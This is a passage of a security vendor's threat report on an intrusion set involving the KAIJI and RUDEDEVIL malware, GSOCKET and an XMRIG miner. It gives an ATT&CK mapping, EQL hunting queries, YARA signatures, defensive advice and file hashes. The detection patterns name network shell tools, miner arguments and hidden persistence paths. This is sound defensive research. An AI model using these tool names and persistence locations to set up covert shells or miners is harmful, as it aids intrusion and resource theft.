Function\",title:\"enviador_slot completarbono Function\",width:\"1698\",height:\"1863\"})}),`\n`,(0,n.jsx)(e.h4,{id:\"likely-used-for-testing-purposes\",children:\"Likely Used for Testing Purposes\"}),`\n`,(0,n.jsx)(e.p,{children:\"It\\u2019s important to note that this script is likely being used for testing purposes, as it interacts with the demo version of the gambling app. This suggests that the attackers might be testing the automation of gambling actions or trying to find vulnerabilities in the app before moving to the live version. The use of a demo environment implies they are refining their approach, potentially in preparation for more sophisticated or widespread attacks.\"}),`\n`,(0,n.jsx)(e.h2,{id:\"ref6138-through-mitre-attck\",children:\"REF6138 through MITRE ATT\u0026CK\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Elastic uses the \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/\",rel:\"nofollow\",children:\"MITRE ATT\u0026CK\"}),\" framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks. During this investigation, we identified the following tactics, techniques and sub-techniques:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.em,{children:\"MITRE ATT\u0026CK tactics, techniques and sub-techniques used\"})}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Tactic\"}),(0,n.jsx)(e.th,{children:\"Technique\"}),(0,n.jsx)(e.th,{children:\"Sub-Technique\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Resource Development\"}),(0,n.jsx)(e.td,{children:\"T1587: Develop Capabilities\"}),(0,n.jsx)(e.td,{children:\"Malware\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1588: Obtain Capabilities\"}),(0,n.jsx)(e.td,{children:\"Tool\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1608: Stage Capabilities\"}),(0,n.jsx)(e.td,{children:\"Upload Malware\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Upload Tool\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Initial Access\"}),(0,n.jsx)(e.td,{children:\"T1190: Exploit Public-Facing Application\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Execution\"}),(0,n.jsx)(e.td,{children:\"T1059: Command and Scripting Interpreter\"}),(0,n.jsx)(e.td,{children:\"Unix Shell\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Python\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1053: Scheduled Task/Job\"}),(0,n.jsx)(e.td,{children:\"Cron\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Persistence\"}),(0,n.jsx)(e.td,{children:\"T1546: Event Triggered Execution\"}),(0,n.jsx)(e.td,{children:\"Unix Shell Configuration Modification\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1053: Scheduled Task/Job\"}),(0,n.jsx)(e.td,{children:\"Cron\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1505: Server Software Component\"}),(0,n.jsx)(e.td,{children:\"Web Shell\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Privilege Escalation\"}),(0,n.jsx)(e.td,{children:\"T1068: Exploitation for Privilege Escalation\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Defense Evasion\"}),(0,n.jsx)(e.td,{children:\"T1140: Deobfuscate/Decode Files or Information\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1222: File and Directory Permissions Modification\"}),(0,n.jsx)(e.td,{children:\"Linux and Mac File and Directory Permissions Modification\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1564: Hide Artifacts\"}),(0,n.jsx)(e.td,{children:\"Hidden Files and Directories\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1070: Indicator Removal\"}),(0,n.jsx)(e.td,{children:\"Timestomp\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1036: Masquerading\"}),(0,n.jsx)(e.td,{children:\"Masquerade Task or Service\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1027: Obfuscated Files or Information\"}),(0,n.jsx)(e.td,{children:\"Software Packing\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Stripped Payloads\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Command Obfuscation\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"Encrypted/Encoded File\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Discovery\"}),(0,n.jsx)(e.td,{children:\"T1057: Process Discovery\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1082: System Information Discovery\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1061: System Network Configuration Discovery\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1049: System Network Connections Discovery\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1007: System Service Discovery\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Collection\"}),(0,n.jsx)(e.td,{children:\"T1119: Automated Collection\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1005: Data from Local System\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Command and Control\"}),(0,n.jsx)(e.td,{children:\"T1071: Application Layer Protocol\"}),(0,n.jsx)(e.td,{children:\"Web Protocols\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1132: Data Encoding\"}),(0,n.jsx)(e.td,{children:\"Standard Encoding\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1001: Data Obfuscation\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1573: Encrypted Channel\"}),(0,n.jsx)(e.td,{children:\"Symmetric Cryptography\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1105: Ingress Tool Transfer\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1571: Non-Standard Port\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1572: Protocol Tunneling\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"T1102: Web Service\"}),(0,n.jsx)(e.td,{})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Impact\"}),(0,n.jsx)(e.td,{children:\"T1496: Resource Hijacking\"}),(0,n.jsx)(e.td,{})]})]})]})}),`\n`,(0,n.jsx)(e.h2,{id:\"detecting-ref6138\",children:(0,n.jsx)(e.strong,{children:\"Detecting REF6138\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Elastic Security implements a multi-layer approach to threat detection, leveraging behavioral SIEM and Endpoint rules, YARA signatures and ML-based anomaly detection approaches. This section describes the detections built by Elastic Security that play a big role in capturing the identified threats.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"detection\",children:\"Detection\"}),`\n`,(0,n.jsx)(e.p,{children:\"The following detection rules were observed throughout the analysis of this intrusion set:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules_building_block/execution_linux_segfault.toml\",rel:\"nofollow\",children:\"Segfault Detection\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/defense_evasion_timestomp_touch.toml\",rel:\"nofollow\",children:\"Timestomping using Touch Command\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_shell_configuration_modification.toml\",rel:\"nofollow\",children:\"Shell Configuration Creation or Modification\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml\",rel:\"nofollow\",children:\"System Binary Moved or Copied\"})}),`\n`]}),`\n`,(0,n.jsx)(e.h3,{id:\"prevention\",children:\"Prevention\"}),`\n`,(0,n.jsx)(e.p,{children:\"The following behavior prevention events were observed throughout the analysis of this intrusion set:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_reverse_shell_via_suspicious_utility.toml\",rel:\"nofollow\",children:\"Linux Reverse Shell via Suspicious Utility\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/defense_evasion_defense_evasion_via_bind_mount.toml\",rel:\"nofollow\",children:\"Defense Evasion via Bind Mount\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_suspicious_child_process_execution_via_interactive_shell.toml\",rel:\"nofollow\",children:\"Linux Suspicious Child Process Execution via Interactive Shell\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_potential_linux_hack_tool_launched.toml\",rel:\"nofollow\",children:\"Potential Linux Hack Tool Launched\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/privilege_escalation_privilege_escalation_via_pkexec_exploitation.toml\",rel:\"nofollow\",children:\"Privilege Escalation via PKEXEC Exploitation\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/lateral_movement_potential_ssh_it_ssh_worm_downloaded.toml\",rel:\"nofollow\",children:\"Potential SSH-IT SSH Worm Downloaded\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml\",rel:\"nofollow\",children:\"Scheduled Job Executing Binary in Unusual Location\"})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"The following YARA Signatures are in place to detect the KAIJI and RUDEDEVIL malware samples both as file and in-memory:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Generic_Threat.yar\",rel:\"nofollow\",children:\"Linux.Generic.Threat\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Hacktool_Flooder.yar\",rel:\"nofollow\",children:\"Linux.Hacktool.Flooder\"})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"The following, soon to be released, endpoint rule alerts were observed throughout the analysis of this intrusion set:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Potential Shell via Web Server\"}),`\n`,(0,n.jsx)(e.li,{children:\"Potential Web Server Code Injection\"}),`\n`,(0,n.jsx)(e.li,{children:\"Potential Shell Executed by Web Server User\"}),`\n`,(0,n.jsx)(e.li,{children:\"Decode Activity via Web Server\"}),`\n`,(0,n.jsx)(e.li,{children:\"Linux Telegram API Request\"}),`\n`,(0,n.jsx)(e.li,{children:\"Suspicious Echo Execution\"}),`\n`]}),`\n`,(0,n.jsx)(e.h3,{id:\"hunting-queries-in-elastic\",children:\"Hunting queries in Elastic\"}),`\n`,(0,n.jsx)(e.p,{children:\"The events for both KQL and EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.\"}),`\n`,(0,n.jsx)(e.h4,{id:\"eql-queries\",children:\"EQL queries\"}),`\n`,(0,n.jsx)(e.p,{children:\"Using the Timeline section of the Security Solution in Kibana under the \\u201CCorrelation\\u201D tab, you can use the below EQL queries to hunt for behaviors similar:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Potential XMRIG Execution\"})}),`\n`,(0,n.jsx)(e.p,{children:\"The following EQL query can be used to hunt for XMRIG executions within your environment.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and (\n  (\n    process.args in (\"-a\", \"--algo\") and process.args in (\n      \"gr\", \"rx/graft\", \"cn/upx2\", \"argon2/chukwav2\", \"cn/ccx\", \"kawpow\", \"rx/keva\", \"cn-pico/tlo\", \"rx/sfx\", \"rx/arq\",\n      \"rx/0\", \"argon2/chukwa\", \"argon2/ninja\", \"rx/wow\", \"cn/fast\", \"cn/rwz\", \"cn/zls\", \"cn/double\", \"cn/r\", \"cn-pico\",\n      \"cn/half\", \"cn/2\", \"cn/xao\", \"cn/rto\", \"cn-heavy/tube\", \"cn-heavy/xhv\", \"cn-heavy/0\", \"cn/1\", \"cn-lite/1\",\n      \"cn-lite/0\", \"cn/0\"\n    )\n  ) or\n  (\n    process.args == \"--coin\" and process.args in (\"monero\", \"arqma\", \"dero\")\n  )\n) and process.args in (\"-o\", \"--url\")\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"MSR Write Access Enabled\"})}),`\n`,(0,n.jsx)(e.p,{children:\"XMRIG leverages modprobe to enable write access to MSR. This activity is abnormal, and should not occur by-default.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and process.name == \"modprobe\" and\nprocess.args == \"msr\" and process.args == \"allow_writes=on\"\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Potential GSOCKET Activity\"})}),`\n`,(0,n.jsx)(e.p,{children:\"This activity is default behavior when deploying GSOCKET through the recommended deployment methods. Additionally, several arguments are added to the query to decrease the chances of missing a more customized intrusion through GSOCKET.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and\nprocess.command_line : (\n\"*GS_ARGS=*\", \"*gs-netcat*\", \"*gs-sftp*\", \"*gs-mount*\", \"*gs-full-pipe*\", \"*GS_NOINST=*\", \"*GSOCKET_ARGS=*\", \"*GS_DSTDIR=*\", \"*GS_URL_BASE=*\", \"*GS_OSARCH=*\", \"*GS_DEBUG=*\", \"*GS_HIDDEN_NAME=*\", \"*GS_HOST=*\", \"*GS_PORT=*\", \"*GS_TG_TOKEN=*\", \"*GS_TG_CHATID=*\", \"*GS_DISCORD_KEY=*\", \"*GS_WEBHOOK_KEY=*\"\n)\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Potential Process Masquerading via Exec\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"GSOCKET leverages the \",(0,n.jsx)(e.code,{children:\"exec -a\"}),\" method to run a process under a different name. GSOCKET specifically leverages masquerades as kernel processes, but other malware may masquerade differently.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and process.args == \"-c\" and process.command_line : \"* exec -a *\"\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Renice or Ulimit Execution\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Several malwares, including KAIJI and RUDEDEVIL, leverage the renice utility to change the priority of processes or set resource limits for processes. This is commonly used by miner malware to increase the priority of mining processes to maximize the mining performance.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and (\n  process.name in (\"ulimit\", \"renice\") or (\n  process.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and process.args == \"-c\" and\n  process.command_line : (\"*ulimit*\", \"*renice*\")\n  )\n)\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Inexistent Cron(d) Service Started\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Both KAIJI and RUDEDEVIL establish persistence through the creation of a \",(0,n.jsx)(e.code,{children:\"cron(d)\"}),\" service in \",(0,n.jsx)(e.code,{children:\"/etc/init.d/cron(d)\"}),\". \",(0,n.jsx)(e.code,{children:\"Cron\"}),\", by default, does not use a \",(0,n.jsx)(e.code,{children:\"SysV Init\"}),\" service. Execution of a \",(0,n.jsx)(e.code,{children:\"cron(d)\"}),\" service is suspicious, and should be analyzed further.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and \n  process.name == \"systemctl\" and process.args == \"start\" and process.args in \n  (\"cron.service\", \"crond.service\", \"cron\", \"crond\")\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Suspicious /etc/ Process Execution from KAIJI\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"/etc/\"}),\" directory is not a commonly used directory for process executions. KAIJI is known to place a binary called \",(0,n.jsx)(e.code,{children:\"32678\"}),\" and \",(0,n.jsx)(e.code,{children:\"id.services.conf\"}),\" in the \",(0,n.jsx)(e.code,{children:\"/etc/\"}),\" directory, to establish persistence and evade detection.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and (process.executable regex \"\"\"/etc/[0-9].*\"\"\" or process.executable : (\"/etc/*.conf\", \"/etc/.*\"))\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Hidden File Creation in /dev/ directory\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Creating hidden files in \",(0,n.jsx)(e.code,{children:\"/dev/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/dev/shm/\"}),\" are not inherently malicious, however, this activity should be uncommon. KAIJI, GSOCKET and other malwares such as \",(0,n.jsx)(e.code,{children:\"K4SPREADER\"}),\" are known to drop hidden files in these locations.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`file where event.type == \"creation\" and file.path : (\"/dev/shm/.*\", \"/dev/.*\")\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Suspicious Process Execution from Parent Executable in /boot/\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Malwares such as KAIJI and XORDDOS are known to place executable files in the \",(0,n.jsx)(e.code,{children:\"/boot/\"}),\" directory, and leverage these to establish persistence while attempting to evade detection.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`process where event.type == \"start\" and event.action == \"exec\" and process.parent.executable : \"/boot/*\"\n`})}),`\n`,(0,n.jsx)(e.h4,{id:\"yara\",children:\"YARA\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Elastic Security has created YARA rules to identify this activity. Below is the YARA rule to identify the custom \",(0,n.jsx)(e.code,{children:\"Apache2\"}),\" malware:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`rule Linux_Trojan_Generic {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-20\"\n        os = \"Linux\"\n        arch = \"x86\"\n        threat_name = \"Linux.Trojan.Generic\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $enc1 = { 74 73 0A 1C 1A 54 1A 11 54 0C 18 43 59 5B 3A 11 0B 16 14 10 0C 14 5B }\n        $enc2 = { 18 1A 1A 1C 09 0D 43 59 0D 1C 01 0D 56 11 0D 14 15 55 18 09 09 15 10 }\n        $enc3 = { 18 1A 1A 1C 09 0D 54 15 18 17 1E 0C 18 1E 1C 43 59 0B 0C }\n        $enc4 = { 34 16 03 10 15 15 18 56 4C 57 49 59 51 2E 10 17 1D 16 0E 0A 59 37 }\n        $key = \"yyyyyyyy\"\n    condition:\n        1 of ($enc*) and $key\n}\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"To detect GSOCKET, including several of its adjacent tools, we created the following signature:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`rule Multi_Hacktool_Gsocket {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-23\"\n        os = \"Linux, MacOS\"\n        arch = \"x86\"\n        threat_name = \"Multi.Hacktool.Gsocket\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $str1 = \"gsocket: gs_funcs not found\"\n        $str2 = \"/share/gsocket/gs_funcs\"\n        $str3 = \"$GSOCKET_ARGS\"\n        $str4 = \"GSOCKET_SECRET\"\n        $str5 = \"GS_HIJACK_PORTS\"\n        $str6 = \"sftp -D gs-netcat\"\n        $str7 = \"GS_NETCAT_BIN\"\n        $str8 = \"GSOCKET_NO_GREETINGS\"\n        $str9 = \"GS-NETCAT(1)\"\n        $str10 = \"GSOCKET_SOCKS_IP\"\n        $str11 = \"GSOCKET_SOCKS_PORT\"\n        $str12 = \"gsocket(1)\"\n        $str13 = \"gs-sftp(1)\"\n        $str14 = \"gs-mount(1)\"\n    condition:\n        3 of them\n}\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, the following signature was written to detect the \",(0,n.jsx)(e.a,{href:\"https://github.com/nicocha30/ligolo-ng\",rel:\"nofollow\",children:\"open source Ligolo-ng tool\"}),\", as we have reason to believe this tool was used during this intrusion.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`rule Linux_Hacktool_LigoloNG {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-20\"\n        os = \"Linux\"\n        arch = \"x86\"\n        threat_name = \"Linux.Hacktool.LigoloNG\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $a = \"https://github.com/nicocha30/ligolo-ng\"\n        $b = \"@Nicocha30!\"\n        $c = \"Ligolo-ng %s / %s / %s\"\n    condition:\n        all of them\n}\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"defensive-recommendations\",children:\"Defensive recommendations\"}),`\n`,(0,n.jsx)(e.p,{children:\"To effectively defend against malware campaigns and minimize the risk of intrusion, it\\u2019s crucial to implement a multi-layered approach to security. Here are some key defensive measures you should prioritize:\"}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Keep Your Elastic Detection Rules Updated and Enabled\"}),\": Ensure that your security tools, including any pre-built detection rules, are up to date. Continuous updates allow your systems to detect the latest malware signatures and behaviors.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Enable Prevention Mode in Elastic Defend\"}),\": Configure Elastic Defend in prevention mode to automatically block known threats rather than just alerting on them. Prevention mode ensures proactive defense against malware and exploits.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Monitor Alerts and Logs\"}),\": Regularly monitor alerts, logs, and servers for any signs of suspicious activity. Early detection of unusual behavior can help prevent a small breach from escalating into a full-blown compromise.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Conduct Threat Hunting\"}),\": Proactively investigate your environment for hidden threats that may have evaded detection. Threat hunting can uncover advanced attacks and persistent malware that bypass traditional security measures.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Implement Web Application Firewalls (WAFs)\"}),\": Use a WAF to block unauthorized or malicious traffic. A properly configured firewall can prevent many common web attacks.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Enforce Strong Authentication for SSH\"}),\": Use public/private key authentication for SSH access to protect against brute force attacks.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Write Secure Code\"}),\": Ensure that all custom software, especially web server technology, follows secure coding practices. Engaging professional security auditors to review your code can help identify and mitigate vulnerabilities before they are exploited.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Regularly Patch and Update Systems\"}),\": Keeping servers, applications, and software up to date is essential to defending against known vulnerabilities. Prompt patching minimizes the risk of being targeted by off-the-shelf exploits.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"By following these recommendations, you can significantly reduce the attack surface and strengthen your defense against ongoing or potential malware threats.\"}),`\n`,(0,n.jsx)(e.h2,{id:\"observations\",children:\"Observations\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The following observables were discussed in this research. These are available for download in STIX or ECS format \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/tree/main/indicators/ref6138\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Observable\"}),(0,n.jsx)(e.th,{children:\"Type\"}),(0,n.jsx)(e.th,{children:\"Name\"}),(0,n.jsx)(e.th,{children:\"Reference\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"72ac2877c9e4cd7d70673c0643eb16805977a9b8d55b6b2e5a6491db565cee1f\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"SystemdXC\"}),(0,n.jsx)(e.td,{children:\"XMRIG\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"82c55c169b6cb5e348be6e202163296b2b5d80fff2be791c21da9a8b84188684\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"apache2\"}),(0,n.jsx)(e.td,{children:\"apache2_unpacked\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"0fede7231267afc03b096ee6c1d3ded479b10ab235e260120bc9f68dd1fc54dd\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"apache2_upx_packed\"}),(0,n.jsx)(e.td,{children:\"apache2_upx_packed\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"9ee695e55907a99f097c4c0ad4eb24ae5cf3f8215e9904d787817f1becb9449e\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"download.sh\"}),(0,n.jsx)(e.td,{children:\"KAIJI 